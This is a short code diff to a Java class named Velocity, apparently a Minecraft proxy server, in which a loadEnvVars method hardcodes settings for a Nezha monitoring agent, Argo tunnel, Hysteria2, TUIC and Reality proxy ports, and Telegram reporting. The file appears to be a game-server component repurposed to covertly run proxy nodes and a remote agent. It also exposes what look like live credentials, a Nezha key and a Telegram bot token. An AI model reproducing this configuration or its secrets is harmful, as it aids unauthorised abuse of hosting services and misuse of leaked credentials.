@@ -146,23 +146,23 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "c6d1e1f8-6982-4bf6-b5e5-360d4be3eda0");
+    envVars.put("UUID", "");
     envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
+    envVars.put("NEZHA_SERVER", "");
     envVars.put("NEZHA_PORT", "");
-    envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
+    envVars.put("NEZHA_KEY", "");
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "24607");
-    envVars.put("TUIC_PORT", "24765");
-    envVars.put("REALITY_PORT", "24607");
+    envVars.put("HY2_PORT", "49572");
+    envVars.put("TUIC_PORT", "");
+    envVars.put("REALITY_PORT", "49572");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6839843424");
     envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
     envVars.put("CFIP", "saas.sin.fan");
-    envVars.put("CFPORT", "");
-    envVars.put("NAME", "HidenCloud-MX");
+    envVars.put("CFPORT", "443");
+    envVars.put("NAME", "Vibe-SE");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
